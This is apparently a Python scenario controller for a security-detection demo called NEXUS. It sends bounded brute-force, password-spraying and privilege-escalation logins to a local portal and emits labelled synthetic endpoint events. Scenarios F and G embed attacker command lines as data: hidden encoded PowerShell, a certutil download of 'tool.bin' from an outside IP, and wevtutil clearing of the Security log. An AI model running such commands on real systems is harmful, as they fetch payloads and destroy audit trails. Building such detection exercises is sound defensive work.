"""Controlled, bounded scenario controller for the NEXUS demo.

Safety: every action targets ONLY the local NEXUS portal (127.0.0.1) or writes clearly labelled synthetic
endpoint records to the demo event stream. Nothing is executed on the host, no real log is cleared, no
real account or group is touched, and every scenario has a fixed, small number of steps.

Authentication scenarios send genuine HTTP requests to NEXUS's /login endpoint, so the resulting
security events are produced by the application's own code ("origin": "nexus-app"). The simulated
client address is passed in a header that NEXUS honours only with the controller's per-process token,
and every such event is flagged "source_address_simulated": true.
"""
from __future__ import annotations

import base64
import http.cookiejar
import random
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

from .events import EventStream

SCENARIOS = {
    "A": ("Normal activity", "Employees and the administrator log in, use the portal and log out."),
    "B": ("Brute force", "12 failed logons against one account from one simulated external source (lockout at 15)."),
    "C": ("Password spraying", "One simulated source tries common passwords against 6 accounts (8 attempts)."),
    "D": ("Suspicious successful login", "10 failures, then a successful logon from the same source, then sensitive access."),
    "E": ("Privilege change", "An approved change by the IT administrator, then an unauthorised self-add to Administrators."),
    "F": ("Suspicious process + audit clearing", "SYNTHETIC endpoint events: encoded PowerShell, then the Security log is cleared."),
    "G": ("Complete attack storyline", "Brute force -> success -> sensitive access -> self-add to Administrators -> "
                                       "SYNTHETIC suspicious process -> SYNTHETIC audit clearing."),
    "H": ("Benign look-alike", "Approved maintenance with a change ticket, a new laptop, and a user who mistypes twice."),
}
ENC = base64.b64encode("Write-Output 'NEXUS demo - harmless text'".encode("utf-16-le")).decode()


class Client:
    """One simulated browser: cookie session + simulated source address."""

    def __init__(self, base, token, source_ip, scenario):
        self.base, self.token, self.ip, self.scenario = base.rstrip("/"), token, source_ip, scenario
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def _req(self, path, data=None):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        req = urllib.request.Request(self.base + path, data=body, headers={
            "X-NEXUS-Sim-Token": self.token, "X-NEXUS-Sim-Source": self.ip, "X-NEXUS-Scenario": self.scenario,
            "User-Agent": "NEXUS-scenario-controller"})
        try:
            with self.opener.open(req, timeout=15) as r:
                return r.status
        except urllib.error.HTTPError as e:
            return e.code

    def login(self, user, password):
        return self._req("/login", {"username": user, "password": password})

    def get(self, path):
        return self._req(path)

    def add_member(self, group, member):
        return self._req("/admin/groups/add", {"group": group, "member": member})

    def logout(self):
        return self._req("/logout")


class ScenarioRunner:
    def __init__(self, stream: EventStream, identities, base_url: str, token: str):
        self.stream, self.ids, self.base, self.token = stream, identities, base_url, token
        self.lock = threading.Lock()
        self.thread = None
        self.pause_ev = threading.Event()
        self.pause_ev.set()
        self.stop_ev = threading.Event()
        self.speed = 1.0          # delay multiplier (tests use < 1)
        self.status = {"scenario": None, "name": None, "state": "idle", "step": 0, "steps": 0, "emitted": 0,
                       "started_at": None, "finished_at": None, "error": None, "log": []}

    # ----------------------------------------------------------------- control
    def busy(self):
        return self.thread is not None and self.thread.is_alive()

    def start(self, sid: str) -> tuple[bool, str]:
        if sid not in SCENARIOS:
            return False, "unknown scenario"
        if self.busy():
            return False, "a scenario is already running"
        steps = getattr(self, f"_steps_{sid}")()
        self.stop_ev.clear()
        self.pause_ev.set()
        self.status.update(scenario=sid, name=SCENARIOS[sid][0], state="running", step=0, steps=len(steps),
                           emitted=0, started_at=time.time(), finished_at=None, error=None, log=[])
        self.thread = threading.Thread(target=self._run, args=(steps,), daemon=True)
        self.thread.start()
        return True, "started"

    def pause(self):
        if self.busy():
            self.pause_ev.clear()
            self.status["state"] = "paused"

    def resume(self):
        if self.busy():
            self.pause_ev.set()
            self.status["state"] = "running"

    def stop(self):
        self.stop_ev.set()
        self.pause_ev.set()

    def wait(self, timeout=120):
        if self.thread:
            self.thread.join(timeout)

    def _run(self, steps):
        seq0 = self.stream.seq
        try:
            for i, (delay, label, fn) in enumerate(steps, 1):
                self.pause_ev.wait()
                if self.stop_ev.is_set():
                    self.status["state"] = "stopped"
                    break
                fn()
                self.status["step"] = i
                self.status["emitted"] = self.stream.seq - seq0
                self.status["log"] = (self.status["log"] + [f"{time.strftime('%H:%M:%S')}  {label}"])[-40:]
                if self.stop_ev.wait(delay * self.speed):
                    self.status["state"] = "stopped"
                    break
            else:
                self.status["state"] = "completed"
        except Exception as exc:  # noqa: BLE001
            self.status.update(state="error", error=f"{type(exc).__name__}: {exc}")
        self.status["emitted"] = self.stream.seq - seq0
        self.status["finished_at"] = time.time()

    # ----------------------------------------------------------------- helpers
    def _pw(self, user):
        return self.ids.passwords[user]

    def _client(self, ip, sid):
        return Client(self.base, self.token, ip, sid)

    def _endpoint(self, sid, host, user, process, parent, command, event_type="process.start"):
        return lambda: self.stream.emit("4688", event_type, user=user, host=host, process=process, parent=parent,
                                        command=command, origin="simulated-endpoint", scenario_id=sid,
                                        payload={"note": "synthetic endpoint telemetry - nothing was executed"})

    def _log_clear(self, sid, host, user):
        steps = [(0.8, f"SYNTHETIC 4688 wevtutil cl Security on {host}",
                  self._endpoint(sid, host, user, "C:\\Windows\\System32\\wevtutil.exe", "C:\\Windows\\System32\\cmd.exe",
                                 "wevtutil.exe cl Security")),
                 (1.0, f"SYNTHETIC 1102 audit log cleared on {host}",
                  lambda: self.stream.emit("1102", "audit.log_cleared", user=user, actor=user, host=host,
                                           origin="simulated-endpoint", scenario_id=sid,
                                           payload={"note": "synthetic - no real log was cleared"}))]
        return steps

    def _failures(self, c, user, n, delay, label):
        return [(delay, f"{label}: failed logon {k + 1}/{n} for {user} from {c.ip}",
                 (lambda u=user: c.login(u, "wrong-" + str(random.randint(1000, 9999))))) for k in range(n)]

    def _session(self, c, user, pages, sid, delay=0.7):
        steps = [(delay, f"{user} logs on from {c.ip}", lambda: c.login(user, self._pw(user)))]
        steps += [(delay, f"{user} opens {p}", (lambda p=p: c.get(p))) for p in pages]
        steps += [(delay, f"{user} logs off", c.logout)]
        return steps

    # ----------------------------------------------------------------- scenarios (bounded step lists)
    def _steps_A(self):
        s = []
        for u in ("arjun.rao", "leela.menon", "omar.khan"):
            c = self._client(self.ids.users[u]["workstation"], "A")
            s += self._session(c, u, ["/dashboard", "/resources/handbook", "/account"], "A")
        a = self._client(self.ids.users["admin01"]["workstation"], "A")
        s += self._session(a, "admin01", ["/admin", "/activity"], "A")
        return s

    def _steps_B(self):
        c = self._client("198.51.100.23", "B")
        return self._failures(c, "arjun.rao", 12, 0.45, "brute force")

    def _steps_C(self):
        c = self._client("192.0.2.77", "C")
        s = []
        for u in ("leela.menon", "vikram.shah", "rahul.iyer", "divya.pillai", "analyst.kiran", "admin01"):
            s.append((0.5, f"spray: Winter2026! against {u}", (lambda u=u: c.login(u, "Winter2026!"))))
        for u in ("leela.menon", "rahul.iyer"):
            s.append((0.5, f"spray: Welcome@123 against {u}", (lambda u=u: c.login(u, "Welcome@123"))))
        return s

    def _steps_D(self):
        c = self._client("203.0.113.45", "D")
        s = self._failures(c, "nisha.kapoor", 10, 0.4, "guessing")
        s += self._session(c, "nisha.kapoor", ["/dashboard", "/resources/payroll-export"], "D", delay=0.8)
        return s

    def _steps_E(self):
        s = [(0.5, "change ticket CHG-4471 approved for 30 min (analyst.kiran -> Report Viewers)",
              lambda: self.stream.register_change_window(30, "CHG-4471", "CAB / IT manager"))]
        a = self._client(self.ids.users["admin01"]["workstation"], "E")
        s += [(0.7, "admin01 logs on", lambda: a.login("admin01", self._pw("admin01"))),
              (0.8, "admin01 adds leela.menon to Finance Approvers (approved)",
               lambda: a.add_member("Finance Approvers", "leela.menon")),
              (0.7, "admin01 logs off", a.logout)]
        m = self._client(self.ids.users["omar.khan"]["workstation"], "E")
        s += [(0.7, "omar.khan (delegated group manager) logs on", lambda: m.login("omar.khan", self._pw("omar.khan"))),
              (0.8, "omar.khan adds himself to Administrators (NOT authorised)",
               lambda: m.add_member("Administrators", "omar.khan")),
              (0.7, "omar.khan logs off", m.logout)]
        return s

    def _steps_F(self):
        h, u = "NEXUS-APP02", "svc_reporting"
        s = [(1.0, f"SYNTHETIC 4688 encoded PowerShell on {h}",
              self._endpoint("F", h, u, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                             "C:\\Windows\\System32\\cmd.exe", f"powershell.exe -NoProfile -w hidden -enc {ENC}"))]
        return s + self._log_clear("F", h, u)

    def _steps_G(self):
        c = self._client("203.0.113.66", "G")
        u = "maya.fernandes"
        s = self._failures(c, u, 11, 0.4, "stage 1 brute force")
        s += [(1.0, f"stage 2: {u} logs on successfully from {c.ip}", lambda: c.login(u, self._pw(u))),
              (0.8, "stage 3: opens finance ledger", lambda: c.get("/resources/finance-ledger")),
              (0.8, "stage 3: opens payroll export", lambda: c.get("/resources/payroll-export")),
              (1.0, "stage 4: adds herself to Administrators", lambda: c.add_member("Administrators", u)),
              (1.2, "stage 5: SYNTHETIC encoded PowerShell on NEXUS-WEB01",
               self._endpoint("G", "NEXUS-WEB01", u, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                              "C:\\Windows\\System32\\cmd.exe", f"powershell.exe -NoProfile -w hidden -enc {ENC}")),
              (0.8, "stage 5: SYNTHETIC certutil download on NEXUS-WEB01",
               self._endpoint("G", "NEXUS-WEB01", u, "C:\\Windows\\System32\\certutil.exe",
                              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                              "certutil.exe -urlcache -split -f http://198.51.100.9/tool.bin C:\\Users\\Public\\tool.bin"))]
        s += self._log_clear("G", "NEXUS-WEB01", u)
        return s

    def _steps_H(self):
        s = [(0.5, "change ticket CHG-4480 approved for 30 min (quarterly access review)",
              lambda: self.stream.register_change_window(30, "CHG-4480", "CAB / IT manager"))]
        a = self._client(self.ids.users["admin01"]["workstation"], "H")
        s += [(0.7, "admin01 logs on for approved maintenance", lambda: a.login("admin01", self._pw("admin01"))),
              (0.8, "admin01 adds analyst.kiran to Administrators (ticket CHG-4480)",
               lambda: a.add_member("Administrators", "analyst.kiran")),
              (0.7, "admin01 logs off", a.logout)]
        v = self._client("10.20.3.77", "H")      # new laptop, inside the HQ address range
        s += self._session(v, "vikram.shah", ["/dashboard"], "H")
        t = self._client(self.ids.users["leela.menon"]["workstation"], "H")
        s += [(0.5, "leela.menon mistypes her password", lambda: t.login("leela.menon", "typo-1")),
              (0.5, "leela.menon mistypes again", lambda: t.login("leela.menon", "typo-2"))]
        s += self._session(t, "leela.menon", ["/dashboard"], "H")
        return s


def backfill_history(stream: EventStream, identities, days: int = 7):
    """Synthetic prior history (labelled origin=baseline-backfill) so per-user baselines exist.

    Each account logs on twice per working day from its usual workstation, between 03:00 and 13:00 UTC
    (08:30-18:30 IST); the service account logs on at night. Times are in the past, so they never mix with
    live activity."""
    now = time.time()
    rnd = random.Random(7)
    day0 = now - days * 86400
    start = day0 - (day0 % 86400)            # midnight UTC
    plan = []
    for d in range(days):
        for u, info in identities.users.items():
            for _ in range(2 if info["role"] != "service" else 3):
                hour = rnd.uniform(0, 24) if info["role"] == "service" else rnd.uniform(3, 13)
                ts = start + d * 86400 + hour * 3600
                if ts < now - 3600:
                    plan.append((ts, u, info))
    for ts, u, info in sorted(plan, key=lambda x: x[0]):          # emitted in time order
        stream.emit("4624", "auth.login_success", user=u, ip=info["workstation"], ts=ts,
                    logon_type="5" if info["role"] == "service" else "10", origin="baseline-backfill",
                    payload={"note": "synthetic baseline history"})
    return stream.seq
